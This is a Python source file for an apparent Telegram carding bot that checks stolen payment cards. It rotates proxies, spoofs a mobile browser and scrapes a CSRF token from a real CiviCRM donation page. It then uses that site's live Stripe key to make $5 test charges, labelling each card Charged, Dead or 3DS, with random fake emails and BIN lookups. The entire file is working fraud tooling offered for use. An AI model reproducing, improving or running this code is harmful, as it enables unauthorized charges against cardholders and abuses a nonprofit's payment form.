import aiohttp
import asyncio
import re
import json
import random
import string
import logging
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

def sanitize_error_message(error_str):
    """Remove proxy URLs and credentials from error messages"""
    sanitized = re.sub(r"url='[^']*'", "url='[PROXY]'", str(error_str))
    sanitized = re.sub(r'http://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    sanitized = re.sub(r'https://[^@]+@[^/\s]+', '[PROXY]', sanitized)
    if '407' in sanitized:
        return "Proxy authentication failed"
    return sanitized

def to_monospace(text):
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:
            result.append(chr(0x1D670 + (code - 65)))
        elif 97 <= code <= 122:
            result.append(chr(0x1D68A + (code - 97)))
        elif 48 <= code <= 57:
            result.append(chr(0x1D7F6 + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)

def to_sans_bold(text):
    result = []
    for char in text:
        code = ord(char)
        if 65 <= code <= 90:
            result.append(chr(0x1D5D4 + (code - 65)))
        elif 97 <= code <= 122:
            result.append(chr(0x1D5EE + (code - 97)))
        elif 48 <= code <= 57:
            result.append(chr(0x1D7EC + (code - 48)))
        else:
            result.append(char)
    return ''.join(result)

class StripeChargeProcessor:
    def __init__(self):
        self.request_timeout = aiohttp.ClientTimeout(total=5)
        self.bin_cache = {}
        self.base_url = "https://swop.ourpowerbase.net"
        self.stripe_key = "pk_live_51IlzILIj39zbqVwKOfD2RX6n9xe4R4XTRpca1U4I2aLw8an3Fd9jm8DE7rQ3NPciJT0J5Ec7FFrqVuyGxzm4rKCq00VjlFos2d"
        self.user_agent = "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36"
        self.user_sessions = {}
        self.user_cooldowns = {}
        self.batch_size = 1
        self.cooldown_seconds = 10
        self.proxy_list = []
        self.proxy_index = 0
        self.load_proxies()

    def load_proxies(self):
        import os
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            random.shuffle(self.proxy_list)
            logger.info(f"Loaded {len(self.proxy_list)} proxies for Gate 2")

    def generate_random_email(self):
        username = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
        domain = random.choice(domains)
        return f"{username}@{domain}"

    def normalize_card_format(self, card_line):
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                return None
            cc, mm, yy_or_yyyy, cvv = parts[0], parts[1], parts[2], parts[3]
            yy = yy_or_yyyy[-2:] if len(yy_or_yyyy) == 4 else yy_or_yyyy
            return f"{cc}|{mm}|{yy}|{cvv}"
        except Exception:
            return None


    def get_next_proxy(self):
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def get_csrf_token(self, session, proxy=None):
        try:
            headers = {
                "Host": "swop.ourpowerbase.net",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "dnt": "1",
                "X-Requested-With": "mark.via.gp",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
            }
            url = f"{self.base_url}/civicrm/contribute/transact?reset=1&id=25"
            async with session.get(url, headers=headers, proxy=proxy) as response:
                text = await response.text()
                csrf_match = re.search(r'"csrfToken":"(.*?)"', text)
                if csrf_match:
                    return csrf_match.group(1)
        except Exception as e:
            logger.debug(f"Error getting CSRF token with proxy {proxy}: {str(e)}")
        return None

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_emoji': data.get('country_emoji', ''),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def process_card(self, card_data):
        start_time = datetime.now()
        try:
            normalized = self.normalize_card_format(card_data)
            if not normalized:
                return {
                    "status": "error",
                    "card": card_data,
                    "message": "Invalid card format",
                    "raw_response": "Invalid format"
                }
            
            parts = normalized.split('|')
            card_number, exp_month, exp_year, cvv = parts
            
            proxy = self.get_next_proxy()
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=self.request_timeout, connector=connector) as session:
                csrf_token = await self.get_csrf_token(session, proxy)
                if not csrf_token:
                    check_time = (datetime.now() - start_time).total_seconds()
                    return {
                        "status": "error",
                        "card": card_data,
                        "message": "Failed to get CSRF token",
                        "raw_response": "Failed to fetch session from site - Rate limited or site blocked",
                        "check_time": check_time
                    }
                
                stripe_headers = {
                    "Host": "api.stripe.com",
                    "sec-ch-ua-platform": '"Android"',
                    "user-agent": self.user_agent,
                    "accept": "application/json",
                    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                    "content-type": "application/x-www-form-urlencoded",
                    "sec-ch-ua-mobile": "?1",
                    "origin": "https://js.stripe.com",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://js.stripe.com/",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
                    "priority": "u=1, i"
                }
                
                stripe_data = {
                    "type": "card",
                    "card[number]": card_number,
                    "card[cvc]": cvv,
                    "card[exp_month]": exp_month,
                    "card[exp_year]": f"20{exp_year}",
                    "billing_details[address][postal_code]": "10006",
                    "guid": "NA",
                    "muid": "NA",
                    "sid": "NA",
                    "payment_user_agent": "stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+card-element",
                    "referrer": "https%3A%2F%2Fswop.ourpowerbase.net",
                    "key": self.stripe_key
                }
                
                async with session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data, proxy=proxy) as stripe_res:
                    stripe_text = await stripe_res.text()
                    stripe_json = json.loads(stripe_text) if stripe_text else {}
                    
                    if 'error' in stripe_json:
                        error_obj = stripe_json['error']
                        error_msg = error_obj.get('message', 'Unknown error')
                        decline_code = error_obj.get('decline_code', '')
                        error_code = error_obj.get('code', '')
                        raw_resp = error_msg
                        if decline_code:
                            raw_resp = f"{error_msg} [{decline_code}]"
                        elif error_code:
                            raw_resp = f"{error_msg} [{error_code}]"
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "declined",
                            "card": card_data,
                            "message": error_msg,
                            "raw_response": raw_resp,
                            "check_time": check_time
                        }
                    
                    pm_id = stripe_json.get('id')
                    if not pm_id:
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Failed to create payment method",
                            "raw_response": stripe_text,
                            "check_time": check_time
                        }
                
                process_headers = {
                    "Host": "swop.ourpowerbase.net",
                    "Connection": "keep-alive",
                    "sec-ch-ua-platform": '"Android"',
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": self.user_agent,
                    "Accept": "*/*",
                    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-mobile": "?1",
                    "Origin": "https://swop.ourpowerbase.net",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://swop.ourpowerbase.net/civicrm/contribute/transact?reset=1&id=25",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
                }
                
                email = self.generate_random_email()
                params_dict = {
                    "paymentMethodID": pm_id,
                    "amount": "5.00",
                    "currency": "USD",
                    "paymentProcessorID": "21",
                    "description": "Support The Haven | SWOP PowerBase",
                    "extraData": email,
                    "csrfToken": csrf_token,
                    "captcha": ""
                }
                
                process_url = f"{self.base_url}/civicrm/ajax/api4/StripePaymentintent/ProcessPublic"
                process_data = {"params": json.dumps(params_dict)}
                
                async with session.post(process_url, headers=process_headers, data=process_data, proxy=proxy) as process_res:
                    process_text = await process_res.text()
                    check_time = (datetime.now() - start_time).total_seconds()
                    
                    try:
                        process_json = json.loads(process_text)
                    except:
                        return {
                            "status": "error",
                            "card": card_data,
                            "message": "Invalid response",
                            "raw_response": process_text[:100],
                            "check_time": check_time
                        }
                    
                    is_error = process_json.get("is_error", 1)
                    values = process_json.get("values", {})
                    
                    if isinstance(values, dict) and values.get("requires_action") == True:
                        return {
                            "status": "3ds",
                            "card": card_data,
                            "message": "3DS Required",
                            "raw_response": "3Ds Approved ✅",
                            "check_time": check_time
                        }
                    
                    if is_error == 0:
                        return {
                            "status": "charged",
                            "card": card_data,
                            "message": "Charged $5",
                            "raw_response": "Payment Successful! Charged $5.00 USD",
                            "check_time": check_time
                        }
                    else:
                        error_msg = process_json.get("error_message", "")
                        if not error_msg:
                            if isinstance(values, dict):
                                error_msg = values.get("error_message", "")
                            elif isinstance(values, list) and len(values) > 0:
                                error_msg = values[0].get("error_message", "") if isinstance(values[0], dict) else ""
                        
                        raw_resp = error_msg if error_msg else process_text[:200]
                        
                        return {
                            "status": "declined",
                            "card": card_data,
                            "message": error_msg if error_msg else "Card declined",
                            "raw_response": raw_resp if raw_resp else "Card declined",
                            "check_time": check_time
                        }
                        
        except asyncio.TimeoutError:
            check_time = (datetime.now() - start_time).total_seconds()
            return {
                "status": "error",
                "card": card_data,
                "message": "Request timeout",
                "raw_response": "Timeout",
                "check_time": check_time
            }
        except Exception as e:
            check_time = (datetime.now() - start_time).total_seconds()
            logger.error(f"Card processing error: {str(e)}")
            return {
                "status": "error",
                "card": card_data,
                "message": str(e),
                "raw_response": str(e),
                "check_time": check_time
            }

    def format_charged_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Charged')} -» {to_monospace('$5')}
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Stripe Charge')} {to_monospace('$5')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_declined_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('Dead!')} ❌
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Stripe Charge')} {to_monospace('$5')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_3ds_message(self, card, bin_info, check_time, user, response):
        bin_info = bin_info or {}
        brand = bin_info.get('brand', 'N/A').upper()
        card_type = bin_info.get('type', 'N/A').upper()
        level = bin_info.get('level', 'N/A').upper()
        bank = bin_info.get('bank', 'N/A').upper()
        country = bin_info.get('country', 'N/A').upper()
        country_flag = bin_info.get('country_flag', '') or bin_info.get('country_emoji', '')
        
        bin_display = f"{to_monospace(brand)} - {to_monospace(card_type)} - {to_monospace(level)}"
        bank_display = to_monospace(bank)
        country_display = to_monospace(country)
        
        username = user.username if user.username else user.full_name
        user_link = f"tg://user?id={user.id}"
        bot_link = "https://t.me/trial9pm"
        
        return f"""TRIAL 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 <a href="{bot_link}">✿</a>
- - - - - - - - - - - - - - - - - - - - - - - -
<a href="{bot_link}">[⌯]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{card}</code>
<a href="{bot_link}">[⌯]</a> 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {to_monospace('3DS')} 🔐
<a href="{bot_link}">[⌯]</a> 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {to_monospace(response)}

<a href="{bot_link}">[⌯]</a> 𝗕𝗶𝗻 ⌁ {bin_display}
<a href="{bot_link}">[⌯]</a> 𝗕𝗮𝗻𝗸 ⌁ {bank_display}
<a href="{bot_link}">[⌯]</a> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_display} {country_flag}

<a href="{bot_link}">[⌯]</a> 𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Stripe Charge')} {to_monospace('$5')}
<a href="{bot_link}">[⌯]</a> 𝗧𝗶𝗺𝗲 ⌁ {to_monospace(f'{check_time:.2f}')}'s
<a href="{bot_link}">[⌯]</a> 𝗨𝘀𝗲𝗱 𝗕𝘆 ⌁ <a href="{user_link}">{to_monospace(username)}</a>
- - - - - - - - - - - - - - - - - - - - - - - -"""

    def format_mass_check_started(self):
        return f"""━━━━━━━━━━━━━━━━━━━━━━
TRIAL 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ✿
𝗚𝗮𝘁𝗲 ⌁ {to_monospace('Stripe Charge')} $5
𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁......
━━━━━━━━━━━━━━━━━━━━━━"""
